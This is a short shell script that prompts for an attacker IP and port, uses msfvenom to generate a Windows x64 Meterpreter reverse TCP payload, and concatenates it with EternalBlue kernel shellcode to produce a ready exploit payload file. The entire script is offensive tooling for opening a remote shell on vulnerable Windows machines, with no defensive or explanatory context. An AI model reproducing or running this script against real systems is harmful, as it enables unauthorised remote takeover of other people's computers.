echo "ip"
read ip
echo "port"
read port
msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o msf_$ip-$port.bin EXITFUNC=thread LHOST=$ip LPORT=$port
cat eternalblue_kshellcode_x64 msf_$ip-$port.bin > sc_x64_$ip-$port.bin
